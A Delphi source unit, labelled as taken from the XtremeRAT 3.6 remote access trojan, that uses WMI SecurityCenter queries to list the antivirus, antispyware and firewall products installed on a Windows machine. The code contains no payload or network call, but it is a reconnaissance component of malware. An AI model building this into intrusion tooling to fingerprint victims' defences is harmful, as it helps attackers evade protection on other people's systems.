unit UnitAntivirus; //From XtremeRAT 3.6 source code

interface

uses
  Windows, SysUtils, ActiveX, ComObj, Variants;

type
  TSecurityCenterInfo = class
    displayName: string;
  end;

  TSecurityCenterProduct = (AntiVirusProduct, AntiSpywareProduct, FirewallProduct);

procedure GetSecInfo(SecurityCenterProduct: TSecurityCenterProduct;
  var SecurityCenterInfo: TSecurityCenterInfo);

implementation

const
  WmiRoot = 'root';
  WmiClassSCProduct: array [TSecurityCenterProduct] of string = ('AntiVirusProduct', 'AntiSpywareProduct', 'FirewallProduct');
  WmiNamespaceSCProduct: array [Boolean] of string = ('SecurityCenter', 'SecurityCenter2');

procedure GetSCProductInfo(SCProduct: TSecurityCenterProduct;
  var SecurityCenterInfo: TSecurityCenterInfo);
var
  FSWbemLocator: OLEVariant;
  FWMIService: OLEVariant;
  FWbemObjectSet: OLEVariant;
  FWbemObject: OLEVariant;
  oEnum: IEnumvariant;
  iValue: LongWord;
  osVerInfo: TOSVersionInfo;
begin
  osVerInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
  GetVersionEx(osVerInfo);
  if (SCProduct=AntiSpywareProduct) and (osVerInfo.dwMajorVersion < 6) then exit;
  FSWbemLocator := CreateOleObject('WbemScripting.SWbemLocator');
  FWMIService := FSWbemLocator.ConnectServer('localhost', Format('%s\%s', [WmiRoot, WmiNamespaceSCProduct[osVerInfo.dwMajorVersion >= 6]]), '', '');
  FWbemObjectSet := FWMIService.ExecQuery(Format('SELECT * FROM %s', [WmiClassSCProduct[SCProduct]]),'WQL',0);
  oEnum := IUnknown(FWbemObjectSet._NewEnum) as IEnumVariant;

  while oEnum.Next(1, FWbemObject, iValue) = 0 do
  begin
    if osVerInfo.dwMajorVersion >= 6 then  //windows vista or newer
      SecurityCenterInfo.displayName := SecurityCenterInfo.displayName + Format('%s',[FWbemObject.displayName]) + ', ' // String
    else
    begin
      case SCProduct of
        AntiVirusProduct: SecurityCenterInfo.displayName := SecurityCenterInfo.displayName + Format('%s' ,[FWbemObject.displayName]) + ', ';// String
        FirewallProduct: SecurityCenterInfo.displayName := SecurityCenterInfo.displayName + Format('%s' ,[FWbemObject.displayName]) + ', ';//String
      end;
    end;
    
    FWbemObject := Unassigned;
  end;
end;

procedure GetSecInfo(SecurityCenterProduct: TSecurityCenterProduct;
  var SecurityCenterInfo: TSecurityCenterInfo);
begin
  try
    CoInitialize(nil);

    try GetSCProductInfo(SecurityCenterProduct, SecurityCenterInfo);
    finally CoUninitialize;
    end;
  except
  end;
end;

end.



